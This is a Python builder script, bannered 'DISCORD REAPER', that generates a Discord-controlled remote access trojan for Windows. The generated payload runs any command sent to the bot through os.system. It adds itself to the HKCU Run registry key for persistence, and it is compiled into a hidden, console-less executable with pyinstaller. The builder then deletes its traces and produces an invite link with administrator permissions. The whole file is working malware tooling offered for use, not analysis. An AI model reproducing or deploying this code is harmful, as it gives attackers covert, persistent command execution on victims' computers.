import os
import requests

os.system('cls')
logo = """

██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗     ██████╗ ███████╗ █████╗ ██████╗ ███████╗██████╗ 
██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗    ██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗
██║  ██║██║███████╗██║     ██║   ██║██████╔╝██║  ██║    ██████╔╝█████╗  ███████║██████╔╝█████╗  ██████╔╝
██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗██║  ██║    ██╔══██╗██╔══╝  ██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗
██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║██████╔╝    ██║  ██║███████╗██║  ██║██║     ███████╗██║  ██║
╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝                                 
"""
print(logo)
token = input("BOT TOKEN -> ")
file_name = input("FILE NAME -> ")
os.system('pip install -r requirements.txt')


bot_code = f"""import discord
from discord.ext import commands
import os
import sys
import winreg as reg
import platform
import threading

# Configuration du bot
intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents)

# Commande pour capturer l'entrée utilisateur et exécuter la commande
@bot.command()
async def command(ctx, *, user_input: str):
    os.system(user_input)

# Fonction pour ajouter le programme au démarrage
def add_to_startup(app_name="WindowsStartup", app_path=None):
    if app_path is None:
        app_path = os.path.abspath(sys.argv[0])  # Par défaut, fichier en cours d'exécution.

    if platform.system() != "Windows":
        print("Ce script est conçu uniquement pour Windows.")
        return

    # Emplacement du registre pour le démarrage
    key = r"Software\Microsoft\Windows\CurrentVersion\Run"

    try:
        # Ouvre la clé du registre
        registry_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)
        
        # Ajoute ou met à jour l'entrée
        reg.SetValueEx(registry_key, app_name, 0, reg.REG_SZ, app_path)
        reg.CloseKey(registry_key)
        print(f"Ajouté au démarrage")
    except Exception as e:
        print(f"Erreur lors de l'ajout au démarrage")

# Fonction principale
def main():
    # Ajoute le fichier actuel au démarrage
    add_to_startup()

    # Lancer le bot Discord dans un thread séparé
    bot_thread = threading.Thread(target=lambda: bot.run("{token}"))
    bot_thread.start()

    # Attendre que le bot démarre (peut être ajusté si nécessaire)
    bot_thread.join()

# Exécution du script
if __name__ == "__main__":
    main()"""

# Crée le fichier .py avec encodage UTF-8
full_file_name = f"{file_name}.py"
with open(full_file_name, "w", encoding="utf-8") as file:
    file.write(bot_code)

os.system(f'pyinstaller --onefile --noconsole {full_file_name}')
os.system('cls')

#supprimer les fichiers inutiles
os.system(f'@del {file_name}.spec')
os.system(f'@del {full_file_name}')

# Définir les en-têtes pour l'autorisation
headers = {
    "Authorization": f"Bot {token}"
}

# URL de l'endpoint API pour récupérer les informations du bot
url = "https://discord.com/api/v10/users/@me"

# Envoyer la requête GET
response = requests.get(url, headers=headers)

# Vérifier si la requête a réussi
if response.status_code == 200:
    bot_info = response.json()
    id = bot_info['id']  # Stocker l'ID dans la variable `id`

    
    # Générer un lien d'invitation avec toutes les permissions
    # La permission maximale est représentée par le chiffre "8" en base 10 (all permissions)
    permissions = 8  # Permissions maximales (valeur entière)
    invite_link = f"https://discord.com/oauth2/authorize?client_id={id}&permissions={permissions}&scope=bot"
    


logo = """

██████╗ ██╗███████╗ ██████╗ ██████╗ ██████╗ ██████╗     ██████╗ ███████╗ █████╗ ██████╗ ███████╗██████╗ 
██╔══██╗██║██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔══██╗    ██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗
██║  ██║██║███████╗██║     ██║   ██║██████╔╝██║  ██║    ██████╔╝█████╗  ███████║██████╔╝█████╗  ██████╔╝
██║  ██║██║╚════██║██║     ██║   ██║██╔══██╗██║  ██║    ██╔══██╗██╔══╝  ██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗
██████╔╝██║███████║╚██████╗╚██████╔╝██║  ██║██████╔╝    ██║  ██║███████╗██║  ██║██║     ███████╗██║  ██║
╚═════╝ ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝                                 
"""
print(logo)
print("BUILD FINISHED, OPEN DIST FOLDER TO GET THE FILE !")
print(f"BOT INVITE : {invite_link}")
os.system('pause >nul')
